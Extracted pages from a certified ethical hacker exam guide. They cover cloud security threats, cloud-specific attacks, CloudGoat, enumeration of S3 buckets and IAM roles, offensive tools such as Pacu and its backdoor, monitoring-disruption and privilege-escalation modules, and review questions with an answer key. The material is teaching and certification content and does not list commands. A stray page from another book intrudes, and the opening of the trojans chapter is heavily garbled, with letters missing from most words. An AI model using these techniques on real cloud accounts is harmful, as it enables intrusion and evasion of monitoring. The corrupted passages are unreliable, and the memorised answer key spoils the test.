Chapter 9: Security in Cloud Computing

357

What Do You See in the Cloud?
Ever lay on your back in a field and watch for cloud animals? Of course you have.
Everyone has either heard or said “You can’t see that giant face in the cloud? THAT
ONE, right THERE!” at some point in their youth. While pareidolia (the psycho-
logical phenomenon in which the mind responds to a stimulus, usually an image or
a sound, by perceiving a familiar pattern where none exists) is fairly common and
something we all experience from time to time, I wondered what cloud computing
would look like from different viewpoints. So I asked some folks to head out to the
virtual field with me and look up.

Some immediately responded through the prism of their own work arena. Charlie
Effland (former Perspecta U.S. Public Sector Federal Government Healthcare CISO)
had a great first response: “Great Dashboards of Compliance... I see half of my solu-
tion that makes sense to be in ‘the Cloud’ providing better border protection, end
point protection, data protection, etc. The other half is on-prem as it should be, for
not all makes sense in the cloud.” Angie Walker (Security Operations Manager at
NASCO, and my lovely and talented wife) said, “I view cloud computing in terms
of how we use it. We host some applications in the cloud to allow managed support
services access to our SIEM, Email, EndPoint protection, mobile device manage-
ment and Web Blocking without providing the vendors access to our data center or
corporate environment. Hosting our e-mail in the cloud allows associates the ability
to read and send e-mail without logging into our corporate VPN so we no longer
have a single point of failure for our primary method of communication when we
have corporate system outages, office closures, or service impacts to our customers.”

My daughter offered thoughts as it related to her recent university experience:
“Most of the time cloud is discussed in security literature as a potential risk to data
security and ownership, which scares people off, but there are some great benefits to
using cloud services. In situations that are changing frequently, such as at universi-
ties, SaaS subscriptions can be changed frequently as needed and can make services
more accessible. For students in school, getting a free or cheap service provided to
them to do homework and projects is much cheaper than having to buy a suite of
applications. Reduction in cost can make education more accessible to students
especially for expenses outside of what is covered in grants and scholarships. Cloud
storage is also a huge benefit. Instead of e-mailing a product or transporting it on
physical media, someone can simply log in and get a copy or edit a project. Also,
when the people editing are doing so from individual accounts, tracking changes
and attributing those changes to people can be done easily. Frequent travel and
changing locations makes it easier for students and small businesses to access their
data on the move. Many students do not have consistent access to campus resources
or the same computers as they go from school, to work, to home, and this is the
answer. Or at least one of them.”

Others offered broader opinions of cloud in general. I heard everything from
“How else would I get music?” to “I don’t really care where and how, just so long
as it’s available.” Opinions closer to our world here included “You mean the end of

(continued )

09-ch09.indd 357 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 9

CEH Certified Ethical Hacker All-in-One Exam Guide

358

my career?” to “I don’t trust someone else to have control over my data’s safeguards.”
Greg Hoare (Perspecta, Cyber Defense and Security Strategy) offered, “A rose by
any other name… a data center is a data center no matter the ethereal name we
give it.” Kris Lloyd (PMP/ITIL-F, former Perspecta VDC Security Project Manager,
Enterprise Security Services) said, “Hmm, that’s a hard one. I guess I’m waiting for
someone to find the unknown massive hole in it. Personally it seems too good to be
true.” For what it’s worth, Kris, there’s a bunch of us in that particular boat.

The point of all this is, for as quickly as we all seem to be racing toward cloud, we
don’t all seem to have a very good grasp of just what, exactly, we’ll be facing there.
There’s no argument it offers tons of benefits, economically and use-wise. But do we
really know what we’re getting into here? Are we sure?

We better be, because that cloud that looks like a bad guy may actually be real.

Next on our list of cloud security threats is insecure interfaces and APIs. Cloud ser-
vices rely heavily on APIs and web services to function and operate, and without them,
functions like auto-scaling, authentication, authorization, and sometimes the operations
of cloud applications themselves will fail. Insecure interfaces and APIs can circumvent
user-defined policies and really mess around with input data verification efforts. Both
provider and subscriber should ensure strong security controls are in place, such as strong
encryption and authorization access to APIs and connectivity. This threat applies to all
cloud service types and cloud deployment models.

NOTE SOA (service-oriented architecture) is a design approach that makes
it easier or application components to cooperate and exchange inormation
on systems connected over a network. It’s designed to allow sotware
components to deliver inormation directly to other components over a
network. For example, one company might develop an API that speciically
provides access to a database they host. Third-party developers could
then create an application to make use o this API, providing better data or
the customer.

Other cloud security threats mentioned that warrant inclusion in our discussion are
insufficient due diligence (for example, moving an application from one cloud environ-
ment to another and not knowing the security differences between the two), shared
technology issues (multitenant environments may not provide proper isolation between
systems and applications), and unknown risk profiles (subscribers simply do not know
exactly what security provisions are made in the background of and by the provider).
Many other threats, such as malicious insiders, inadequate design, and DDoS, are valid
for both cloud services and traditional data centers.

09-ch09.indd 358 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 9

Chapter 9: Security in Cloud Computing

359

Cloud Attacks and Mitigations
Attacks against cloud computing are as varied and crazed as those against anything
else. Social engineering, for instance, is a good attack vector no matter what the
environment—why bother with technology-specific attacks when you can just ask
people for credentials or get them to click a link in an e-mail? SQL injection and cross-
site scripting? Of course—they work just as well when the apps and databases are hosted
on somebody else’s servers. Other attacks that work everywhere else are also apropos for
cloud systems—DNS poisoning and session hijacking both work just as well here as
they would anywhere else.

A couple of interesting cloud-based attacks are out there, though. Two that ECC men-
tions specifically are session riding and side channel attacks. Session riding is, in effect,
simply CSRF (cross-site request forgery; covered in Chapter 6) under a different name
and deals with cloud services instead of traditional data centers. A side channel attack, also
known as a cross-guest VM breach, deals with the virtualization itself. If an attacker can
somehow gain control of an existing VM (or place his own) on the same physical host as
the target, he may be able to pull off lots of attacks.

NOTE You may be wondering why an attacker who already has access to
the physical host would need to bother with the complication o adding
another VM in an eort to steal data rom a target. Part o the reason or
that is a undamental security aspect o cloud data, which is that the people
who administer the hardware and abric o the system cannot access user
data. Thereore, just having access to hardware isn’t going to do the trick or
attackers anymore.

In addition to the usual suspects, there are a few other cloud-specific attacks you’ll
definitely want to make yourself aware of for the exam. A so-called cloudbourne attack
takes advantage of vulnerabilities in the bare-metal cloud server itself, using backdoor
channels to bypass security operations. A man-in-the-cloud (MITC) attack is pretty much
exactly as it sounds: the attacker abuses cloud file synchronization services to intercept
and manipulate communications. And something called a cloud hopper attack occurs
when an attacker uses a spear phishing campaign with custom malware to compromise
cloud service staff and firms. There are plenty of other cloud-specific attacks, with new
names popping up every day, so my best advice is if cloud security is in your future, start
reading. A lot. There are multiple web resources on current trends (check out the “2020
AWS Cloud Security Report” on https://www.cloudpassage.com/lp/2020-aws-cloud-
security-report/, for example), active intelligence on new findings, and tons of training
and insight on security steps individuals and enterprises can take.

NOTE Other attacks against the cloud can include many that apply in every
other area, such as a wrapping attack (where a SOAP message is intercepted
and the data in the envelope is changed and then sent/replayed) and
cryptanalysis, which we will explore in Chapter 11 (same principles, just
applied to cloud computing).

09-ch09.indd 359 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 9

CEH Certified Ethical Hacker All-in-One Exam Guide

360

Cloud Hacking
Attacking cloud services may seem either very daunting or a gold mine of opportunity
to you, depending on your outlook. The attack surface appears to be everywhere, but the
underlying technology is so unique that it’s hard to put a finger on. So let’s keep things
straightforward and concentrate on the attack methods, tools, and techniques that CEH
concentrates on.

First and foremost, if you’re going to learn how to do something, it’s very helpful to
have something you can practice on. One resource you might turn to in this arena is
called CloudGoat (https://rhinosecuritylabs.com/aws/cloudgoat-vulnerable-design-aws-
environment/). From the Rhino Security Labs website: “Correctly executing penetration
tests against AWS environments is a difficult, complicated task that requires knowledge and
practice in a variety of different areas…. A problem that shows up here is that there is cur-
rently not any easy way to test and learn these skills…. There aren’t these kinds of resources
for learning penetration testing and attack techniques against AWS environments…. To
address these needs, we created CloudGoat—an inexpensive, simple, vulnerable-by-design
AWS environment that can be deployed and shut down at will.” CloudGoat provides several
“capture the flag” scenarios for your practice, so check it out as an avenue to learn as safely as
you can (per the site, you can erroneously open yourself up to exterior attacks by changing
configurations outside recommendations/as a results of your “attacks”).

OK, now that we have a means to practice, how do we go about hacking cloud offer-
ings? Not so surprisingly, it’s a lot like attacking anything else. Identify targets, scan
them for vulnerabilities, enumerate as much information as you can, stage attacks based
on all this knowledge, gain (and maintain) access, and carry out exploits. Tools available
for container vulnerability scanning include Trivy, Clair, and Dadga (all available on
https://github.com) and Sysdig (for Kubernetes cluster vulnerabilities in particular and
found at https://sysdig.com).

Enumeration in cloud services involves a lot of different avenues. For example, Ama-
zon Simple Storage Service (S3) buckets are cloud services that store files, folders, and
other information from various applications. You can find them via HTML inspection of
certain web page source code, reverse IP searches, Google hacking, or via use of tools like
S3Scanner (https://github.com). S3 bucket permissions themselves can be enumerated
using a tool called S3Inspector, also available on GitHub.

Keeping in the AWS realm, you can also enumerate AWS Account IDs through every-
thing from error messages, code repositories, and Lambda functions to simply checking
boards where folks are posting help requests. Identity and access management (IAM)
roles play a large part in AWS (and other) cloud services, and there are innumerable
security articles and tools devoted to their use and configuration. AWS error messages
tend to help in enumerating these roles, providing information on services in use, any
third-party tie-ins, and IAM user names.

EXAM TIP Kubernetes setups store cluster data, API objects, and service
discovery details in a distributed, key-value storage called “etcd,” which can
be examined to identiy endpoints in the environment.

Tools for actually attacking cloud services are just as varied. Pacu (https://
rhinosecuritylabs.com/aws/pacu-open-source-aws-exploitation-framework/) is an open

09-ch09.indd 360 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 9

Chapter 9: Security in Cloud Computing

361

source AWS exploitation framework that has been called the “Metasploit of the cloud.”
Per the site, “Pacu is a comprehensive AWS security-testing toolkit designed for offensive
security practitioners” and “is capable of testing S3 bucket configuration and permis-
sion flaws, establishing access through Lambda backdoor functions, compromising EC2
instances, exfiltrating data, escalating privileges, and covering tracks by disrupting moni-
toring and logging, including CloudTrail, GuardDuty, and others.” The official CEH
courseware only briefly mentions Pacu in a very long list of cloud tools to remember and
test within labs, but I have a sneaky suspicion that, at some point in the near future, EC-
Council will add more exam focus toward it. Therefore, here are some popular modules
within Pacu, directly from the developer site, and what they do:

• confirm_permissions Enumerates a list of confirmed permissions for the
current account

• privesc_scan Abuses 20+ different privilege escalation methods to gain
further access

• cloudtrail_csv_injection Injects malicious formulas into CloudTrail CSV exports

• disrupt_monitoring Targets GuardDuty, CloudTrail, Config, CloudWatch,
and VPC to disrupt various monitoring and logging capabilities

• backdoor_users_[keys/passwords] Establishes backdoor account access by
adding credentials to other IAM user accounts

• sysman_ec2_rce Abuses the AWS Simple Systems Manager to try and gain
root (Linux) or SYSTEM (Windows) level remote code execution on various
EC2 instances

• backdoor_ec2_sec_groups Adds backdoor rules to EC2 security groups to
give you access to private services

Other tools of note, all of which are available on GitHub, include DumpsterDiver,
used to identify potential leaks and credentials in target clouds; Cloud Container Attack
Tool (CCAT), which holds various modules to accomplish things like enumerating
repositories and creating/installing a backdoor for future use; dockerscan, a docker analy-
sis and hacking tool that lets you do everything from backdooring a container to scan-
ning registries, manipulating settings, and extracting/modifying images themselves; and
AWS pwn, a tool that does everything from reconnaissance and gaining access to privi-
lege escalation and clearing tracks.

Sometimes It Really Is Your Job
A long time ago I was managing security for a desktop contract at Kennedy Space
Center. Part of my job there was providing post-incident analysis to leadership, and
on many occasions those little wrap-up sessions were related to a malware infection
on a user’s system. This was frustrating on a number of levels, as we had multiple
protections in place to help users avoid malware and we spent an inordinate amount

(continued )

09-ch09.indd 361 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 9

CEH Certified Ethical Hacker All-in-One Exam Guide

362

of time and effort educating our user base. Yet, invariably, I’d respond to a malware
incident only to be told by the user, “Well my system has antivirus installed, doesn’t
it? Why didn’t that protect me?” But the kicker, the one response that still rattles me
today, was from one individual who’d gone to a site he shouldn’t have been at on his
work system. After sitting down and reviewing everything, I reminded him of how
important malware prevention is to the enterprise, and his response was priceless:
“Isn’t that your job?”

Amazon Web Services found itself in a somewhat similar position, and discov-
ered its job in hosting cloud services isn’t just hosting. Prior to late 2018, AWS got a
lot of bad press because its users weren’t securing data buckets that were left vulner-
able to attackers. It’s important here to pause and think about who was responsible
for these buckets being left wide open to attack, as it certainly wasn’t AWS; the users
had a lax view of security and did not secure the buckets. In other words, AWS pro-
vided the service, and the owners of the buckets simply did nothing about security.
In response, AWS did what many of us would do—a lot of work scrubbing default
settings and such to make it much more difficult for this to accidentally occur. In
other words, AWS tried to make it as difficult as possible for end users to allow
themselves to be open to attack.

The real question, though, is “Should AWS have had to do so?” Should a com-
pany be blamed for default settings that users simply don’t pay attention to?

It appears, societally, the answer to that question may already be in full view.
Microsoft has been blamed for decades for every open default setting exploited by
hackers on the Internet. McDonald’s had to add “This is a hot beverage” warnings
on its coffee cups. There is a warning label on pepper spray that states the contents
may irritate eyes, a label on my wife’s hair dryer that says you shouldn’t use it while
sleeping, and I literally have a warning label on my chainsaw that reads “Warning;
Don’t handle chainsaw by the wrong end,” with an icon picture of a hand getting
wrapped up in the chain.

So, while it wasn’t really “hacking the cloud,” and not necessarily a poor design
choice on AWS’s part, its default settings, designed to be used by the customer to
administer their own buckets and provide the most flexibility for given scenarios,
can’t truly be left open for owner use. In other words, you just can’t trust folks to
secure things themselves, and a breach caused by a bucket administrator’s own lax
security is still a breach associated with your service.

Hacking the cloud isn’t some wild fantasy with loads of additional tools and skill-
sets needed by a master hacking genius. Instead, it’s entirely possible by all methods
this book touches on, because developers, businesses, and many other entities still
have to push things, develop things, or otherwise use traditional IT systems to make
it happen. For attackers, the secret to getting into someone’s cloud services is likely
as simple as gaining access to the traditional infrastructure. For example, Microsoft
will gladly integrate its cloud services into your existing domain (no need for a new
forest setup), and if that domain is extended into the new environment for cloud
and you’re already compromised, well, now you’ve embraced the cloud and still are
totally p0wned.

09-ch09.indd 362 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 9

Chapter 9: Security in Cloud Computing

363

I’m sure, whether in school as part of a group project or at work in a similar posi-
tion, you’ve heard someone say in response to your request, “That’s not my job.”
Usually, in my experience, that phrase always hits at the absolute worst time, when
I need the task or deliverable immediately, and dealing with personal opinions and
work ethics involved in all of it drive me nuts. And perhaps the most frustrating
examples are those where the person is absolutely right—it truly wasn’t their job. In
security, in this arena we’ve all thrown our collective hats into, that’s unfortunately
something you will never get to say. Because it’s all your job.

Is there more to know about the cloud? Of course there is, and we could have expanded
this discussion to include a lot more information. However, the subject material is so vast,
broad, and varied, I didn’t think getting too far down in the weeds would be relevant at
this point. Should you decide to concentrate in the cloud arena, there are other certifi-
cations and study efforts you should definitely check into. For most of us, the cloud is
simply one more attack vector, one more area of focus that provides its own interesting
security and attack concerns. This chapter should give you what you need to prepare for
the CEH exam, which is what you bought this book for in the first place. My suggestion,
though, is to definitely keep your head in the cloud. A lot of computing is headed there,
so why not immerse yourself now?

Chapter Review
Virtualization is a practice whereby the physical aspects of the hardware are virtually pre-
sented to operating systems in a way that allows more than one virtual machine (each with
its own operating system) to run simultaneously on the same physical box. Cloud comput-
ing provides user and enterprise subscribers on-demand delivery of various IT services as
a metered service over a network. Cloud computing offers everything from on-demand
self-service, storage, and resource pooling to elasticity, automation in management, and
broad network access. Cloud computing can be thought of as the ultimate in separation
of duties. It moves system services that would otherwise be hosted internally to an external
provider. It also separates the role of data owner from the role of data custodian.

There are multiple types of cloud computing, including Infrastructure as a Service
(IaaS), Platform as a Service (PaaS), Software as a Service (SaaS), Identity as a Service
(IDaaS), Function as a Service (FaaS), Security as a Service (SECaaS), and Container as
a Service (CaaS).

A container is a package holding components of a single application and all its depen-
dencies, relying on virtual isolation to deploy and run that application. Containers are
designed to virtualize a single application, not an OS (that would be for your VM to
provide). Docker is the industry leader in container management, and Docker Engine
runs on various Linux distributions and Windows Server operating systems, enabling
containerized applications to run anywhere consistently on any infrastructure.

Kubernetes, aka “K8s,” is an open source container management platform, origi-
nally developed by Google and now in the hands of the Cloud Native Computing

09-ch09.indd 363 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 9

CEH Certified Ethical Hacker All-in-One Exam Guide

364

Foundation, designed to run across clusters (whereas Docker is designed for a single
system). Kubernetes and Docker often are used together, with Docker instances run-
ning on individual systems inside a Kubernetes cluster.

Along with the types of cloud services, there are different deployment models: public,
private, community, hybrid, and multi. In a public cloud model, services are provided
over a network that is open for public use (like the Internet). In a private cloud model,
the cloud is private, operated solely for a single organization (aka single-tenant environ-
ment), and is usually not a pay-as-you-go operation. A community cloud model is one
where the infrastructure is shared by several organizations, usually with the same policy
and compliance considerations. A hybrid cloud model is a composition of two or more
cloud deployment models. A multi-cloud combines workloads across multiple cloud pro-
viders in one heterogeneous environment.

NIST released SP 500-292, NIST Cloud Computing Reference Architecture, to pro-
vide a “fundamental reference point…to describe an overall framework that can be used
government-wide.” This publication defined five major roles within a cloud architecture:
cloud carrier (the organization that has the responsibility of transferring the data—that
is, the intermediary for connectivity and transport between subscriber and provider);
cloud consumer (the individual or organization that acquires and uses cloud products
and services); cloud provider (the purveyor of products and services); cloud broker (acts
to manage use, performance, and delivery of cloud services, as well as the relationships
between providers and subscribers); and cloud auditor (an independent assessor of cloud
service and security controls).

The Federal Risk and Authorization Management Program (FedRAMP) is proba-
bly the most recognized and referenced regulatory effort regarding cloud computing.
FedRAMP “is a government-wide program that provides a standardized approach to
security assessment, authorization, and continuous monitoring for cloud products and
services.” FedRAMP not only provides an auditable framework for ensuring basic secu-
rity controls for any government cloud effort but also offers faqs for security and configu-
ration and even has free training available on the site. PCI SSC Cloud Computing Guide-
lines published by the Cloud Special Interest Group PCI Security Standards Council also
provides notables assistance and information for the cloud.

The Cloud Security Alliance (CSA) is the leading professional organization devoted
to promoting cloud security best practices and organizing cloud security professionals.
In addition to providing a certification on cloud security and offering an array of cloud-
centric training, CSA has published a general cloud enterprise architecture model to help
professionals conceptualize the components of a successful cloud implementation. CSA
also publishes documentation on everything from privacy concerns to security controls,
focus, and implementation.

Cloud security is really talking about two sides of the same coin—you must be con-
cerned with the security of the provider as well as that of the subscriber. Both the provider
and subscriber are responsible for security. Using virtualization introduces a hypervisor
layer between the physical hardware and subscribed servers. Therefore, if you compro-
mise the hypervisor, you compromise them all.

The Trusted Computing Model refers to an attempt to resolve computer security
problems through hardware enhancements and associated software modifications. The
Trusted Computing Group (TCG) is made up of a bunch of hardware and software

09-ch09.indd 364 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 9

Chapter 9: Security in Cloud Computing

365

providers who cooperate to come up with specific plans. Roots of Trust (RoT) is a
set of functions within the Trusted Computing Model that are always trusted by the
computer’s operating system.

Tools to assist in cloud security include Core CloudInspect and CloudPassage Halo.
Core CloudInspect is “a tool that profits from the Core Impact & Core Insight technol-
ogies to offer penetration-testing as a service from Amazon Web Services for EC2 users.”
It’s designed for AWS cloud subscribers and runs as an automated, all-in-one testing
suite specifically for your cloud subscription. CloudPassage Halo provides instant vis-
ibility and continuous protection for servers in any combination of data centers, private
clouds and public clouds. The Halo platform is delivered as a service, so it deploys in
minutes and scales on demand. Halo uses minimal system resources, so layered security
can be deployed where it counts, right at every workload—servers, instances, and con-
tainers. Other cloud-specific tools and toolsets mentioned include Qualys Cloud Suite,
Trend Micro’s Instant-On Cloud Security, and Panda Cloud Office Protection.

Cloud Security Alliance released a publication titled “The Dirty Dozen: 12 Top
Cloud Security Threats” (also referred to as “The Treacherous 12: Cloud Computing
Top Threats in 2016”), and EC-Council has its own list of top cloud security threats.
Important ones to remember include data breach or loss, abuse of cloud resources, and
insecure interfaces and APIs.

Other cloud security threats are insufficient due diligence (for example, moving an
application from one cloud environment to another and not knowing the security dif-
ferences between the two), shared technology issues (multitenant environments may not
provide proper isolation between systems and applications), and unknown risk profiles
(subscribers simply do not know exactly what security provisions are made in the back-
ground of and by the provider). Many other threats, such as malicious insiders, inad-
equate design, and DDoS, are valid for both cloud services and traditional data centers.

SOAP (Simple Object Access Protocol) is a protocol that makes it easier for applica-
tion components to cooperate and exchange information on systems connected over a
network. A wrapping attack occurs when a SOAP message is intercepted and the data in
the envelope is changed and then sent/replayed.

In addition to every other attack mentioned previously in this book, other attacks
specific to cloud computing include

• Session riding CSRF under a different name and deals with cloud services
instead of traditional data centers.

• Side channel attack, aka cross-guest VM breach Deals with the virtualization
itself: if an attacker can somehow gain control of an existing VM (or place his
own) on the same physical host as the target, he may be able to attempt a litany
of attacks and efforts.

• Cloudbourne attack Takes advantage of vulnerabilities in the bare-metal cloud
server itself, using backdoor channels to bypass security operations.

• Man-in-the-cloud (MITC) attack The attacker abuses cloud file
synchronization services to intercept and manipulate communications.

• Cloud hopper attack Occurs when an attacker uses a spear phishing campaign
with custom malware to compromise cloud service staff and firms.

09-ch09.indd 365 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 9

CEH Certified Ethical Hacker All-in-One Exam Guide

366

CloudGoat (https://rhinosecuritylabs.com/aws/cloudgoat-vulnerable-design-aws-
environment/) provides an inexpensive, simple, vulnerable-by-design AWS environ-
ment that can be deployed and shut down at will and that allows for several “capture
the flag” type scenarios for practice. Methods for attacking cloud offerings don’t dif-
fer much from other traditional methodologies: identify targets, scan them for vul-
nerabilities, enumerate as much information as you can, stage attacks based on all
this knowledge, gain (and maintain) access, and carry out exploits. Tools available
for container vulnerability scanning include Trivy, Clair, and Dadga (all available on
https://github.com) and Sysdig (for Kurbernetes cluster vulnerabilities in particular
and found at https://sysdig.com).

Amazon Simple Storage Service (S3) buckets are cloud services that store files, folders,
and other information from various applications. S3 bucket permissions can be enumer-
ated using a tool called S3Inspector, also available on GitHub.

You can also enumerate AWS Account IDs through everything from error messages,
code repositories, and Lambda functions to simply checking boards where folks are
posting help requests. Identity and access management (IAM) roles play a large part in
AWS (and other) cloud services, and there are innumerable security articles and tools
devoted to their use and configuration. AWS error messages tend to help in enumerat-
ing these roles, providing information on services in use, any third-party tie-ins, and
IAM user names.

Kubernetes setups store cluster data, API objects, and service discovery details in a
distributed, key-value storage called “etcd,” which can be examined to identify endpoints
in the environment.

Pacu (https://rhinosecuritylabs.com/aws/pacu-open-source-aws-exploitation-framework/)
is an open source AWS exploitation framework that has been called the “Metasploit of the
cloud.” Other tools of note, all of which are available on GitHub, include DumpsterDiver,
used to identify potential leaks and credentials in target clouds; Cloud Container Attack Tool
(CCAT), which holds various modules to accomplish things like enumerating repositories
and creating/installing a backdoor for future use; dockerscan, a docker analysis and hacking
tool that lets you do everything from backdooring a container to scanning registries, manipu-
lating settings, and extracting/modifying images themselves; and AWS pwn, a tool that does
everything from reconnaissance and gaining access to privilege escalation and clearing tracks.

Questions
1. Implementing cloud computing provides many benefits. Which of the following

is the best choice of a security principle applicable to implementing cloud
security?
A. Need to know
B. Least privilege
C. Job rotation
D. Separation of duties

09-ch09.indd 366 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 9

Chapter 9: Security in Cloud Computing

367

2. Which of the following best represents SOA?
A. File server
B. An application containing both the user interface and the code allowing access

to the data
C. An API that allows different components to communicate
D. A single database accessed by multiple sources

3. Which cloud computing model is geared toward software development?
A. IaaS
B. PaaS
C. SaaS
D. Private

4. Amazon EC2 provides virtual machines that can be controlled through a service
API. Which of the following best defines this service?
A. IaaS
B. PaaS
C. SaaS
D. Public

5. Google Docs and Salesforce CRM are two examples of which cloud computing
service type?
A. IaaS
B. PaaS
C. SaaS
D. Public

6. Which of the following cloud computing attacks can be best described as a
CSRF attack?
A. Session riding
B. Side channel
C. Cross-guest VM breach
D. Hypervisor attack

7. Which of the following best describes a wrapping attack?
A. CSRF-type attack against cloud computing resources.
B. An attack that involves leveraging a new or existing VM on a physical device

against another VM.
C. A SOAP message is intercepted, data in the envelope is changed, and then the

data is sent/replayed.
D. The virtual machine management system on the physical machine is

corrupted or administrative control is gained over it.

09-ch09.indd 367 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 9

CEH Certified Ethical Hacker All-in-One Exam Guide

368

8. In the NIST Cloud Computing Reference Architecture, which of the following
has the responsibility of transmitting the data?
A. Cloud provider
B. Cloud carrier
C. Cloud broker
D. Cloud consumer

9. In the NIST Cloud Computing Reference Architecture, which component
acts to manage use, performance, and delivery of cloud services, as well as the
relationships between providers and subscribers?
A. Cloud provider
B. Cloud carrier
C. Cloud broker
D. Cloud consumer

10. In the NIST Cloud Computing Reference Architecture, which component
acquires and uses cloud products and services?
A. Cloud provider
B. Cloud carrier
C. Cloud broker
D. Cloud consumer

Answers
1. D. While implementing cloud computing doesn’t fully address separation of

duties, of the choices provided it’s the only one that makes sense. The cloud,
by its nature, can separate the data owner from the data custodian (the cloud
provider assumes the role).

2. C. Service-oriented architecture (SOA) is all about software components delivering
information to one another on a network, and this is the best available answer.

3. B. Platform as a Service (PaaS) provides a development platform that allows
subscribers to develop applications without building the infrastructure that
normally would be required to develop and launch software.

4. A. Amazon Elastic Compute Cloud (EC2) provides resizable compute capacity
in the cloud via VMs that can be controlled via an API, thus fitting the
definition of IaaS.

5. C. Software as a Service best describes this. SaaS is simply a software distribution
model—the provider offers on-demand applications to subscribers over the Internet.

6. A. Session riding is simply cross-site request forgery (CSRF) under a different
name and deals with cloud services instead of traditional data centers.

09-ch09.indd 368 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 9

Chapter 9: Security in Cloud Computing

369

7. C. Wrapping attacks involve messing with SOAP messages and replaying them
as legitimate.

8. B. Akin to the power distributor for the electric grid, the cloud carrier is the
intermediary for connectivity and transport between subscriber and provider.

9. C. Per SP 500-292, the cloud broker “acts as the intermediate between consumer
and provider and will help consumers through the complexity of cloud service
offerings and may also create value-added cloud services as well.”

10. D. The cloud consumer is the subscriber, who engages a provider for services.

09-ch09.indd 369 14/09/21 4:03 PM



Passport_2019 / Mike Meyers’ CompTIA Security+™ Certifcation Passport / Dunkerley / 795-3 / FM / Blind olio: vi

This page intentionally left blank

00-FM.indd 6 09/11/20 6:45 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 10

CHAPTER

Trojans and Other Attacks 10
In this chapter you will

• Describe malware types and their purpose
• Identiy malware deployment methods
• Describe the malware analysis process
• Identiy malware countermeasures
• Describe DoS attacks and techniques
• Identiy DoS detection and countermeasure action
• Describe session hijacking and sequence prediction

My erly eories, forged in the stoping grounds of y childhood upbringing in LA
(Lower Alb), ost often revolve round fishing, hunting, cping, or blowing stuff
up. Bck then, fireworks were  wee bit stronger thn they re now, prentl supervision
wsn’t, nd we were encourged to get out of the house to use ourselves nd spre our
others  little bit of snity. And while y cousins nd I certinly went through our fir
shre of gunpowder, running round y uncle’s property in Mount Vernon, Alb,
we found ny other wys to bring bout destruction in our little neck of the woods. In
one of these eories, y cousin wound up nerly deciting n entire pond’s worth
of fish with nothing but  bg nd  shovel.

The dy before going up to y uncle’s fr, I’d herd one of y dd’s friends tlking
bout wlnuts nd how dngerous they were. It turns out the hulls hve lods of tnnin
nd nturl herbicides in the, which cn be lethl to plnts growing round the wter-
shed of ny wlnut tree. It ws definitely  cool nd fun fct, but it didn’t do nything for
e until I herd the lst little nugget of the converstion: “Just don’t ever throw the in
your pond. They’ll displce ll the oxygen nd kill ll your fish.”

Ared with this knowledge, y cousin nd I filled  big burlp sck full of wlnut
husks nd drug it out to one of the fr ponds to see whether it would work. We thought
tht siply chucking it into the pond wouldn’t be very effective, nd becuse sweet te
seeed to be better (nd steep fster) when the te bgs were oved round, we decided
to cover s uch of the surfce re of the pond s possible. So, we dunked the bg into
the wter nd strted drgging it round the bnk of the pond. While not  perfect circle,
the pond wsn’t so big or weirdly shped tht we couldn’t ke it ll the wy round, nd
in bout ten inutes we’d de our first lp. We left the bg in the wter nd st down

371

10-ch10.indd 371 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 10

CEH Certified Ethical Hacker All-in-One Exam Guide

372

to wtch wht would hppen. With  few inutes, we sw the first fish coe to the top
of the wter, lzily swiing bout trying to gsp for oxygen. We scooped hi up nd
tossed hi into the bucket. Then the second ppered. And  third. Then suddenly, in 
scene right out of  horror story, hundreds of fish just popped up to the surfce ll t once.

We pnicked. Wht hd we done? This ws supposed to result, if it worked t ll, in
 few fish we could tke hoe nd ybe convince Uncle Donny to fry up for dinner.
Insted, we hd fr pond genocide on our hnds, nd ore fish thn we knew wht
to do with. We pulled the bg out of the wter nd flung it out into the woods nd then
grbbed up s ny bodies s we could crry nd took the hoe. And before confess-
ing to our prents wht we’d done, we clened ll the fish nd hd the on ice, redy for
cooking. We y hve been innocent kids cught in  weird sitution, but we weren’t
dub— fried fish el prepred in dvnce could ke up for  lot of nughtiness.

So, wht does ll this hve to do with our book on ttcking systes? While drgging
 bg full of old wlnuts through  pond isn’t the “norl” wy to ctch  ess of fish
for  dinner, it certinly works—soeties surprisingly well. Just like the bg of wlnuts,
lwre nd other ttcks y be soething you overlook s vilble options, but they
cn relly work well for your end gol. Never forget tht you cn often ctch ore thn
you expect by using tools nd circustnces in unexpected wys. A lot of the ters nd
issues we discuss here y not necessrily see like  hcker’s prdise, but I cn proise
you it’s ll relevnt. And we’ll cover these ters nd issues for two iportnt resons:
you’ll be  better pen test eber by tking dvntge of everything t your disposl,
nd it’s ll on the CEH ex!

The “Malware” Attacks
Malware is generlly defined s softwre designed to hr or secretly ccess  coputer
syste without the owner’s infored consent. And, ore often thn not, people in our
profession think of lwre s hostile, intrusive, nnoying, nd definitely soething to
be voided. Fro the perspective of  hcker, though, soe lwre y ctully be
usble, provided it’s used within the confines of n greed-upon contrct in  pen test.
Let e be bsolutely cler here: I  not encourging you to write, proote, or forwrd
viruses or lwre of ny kind. I’ siply providing you with the infortion you need
to know to be successful on your ex.

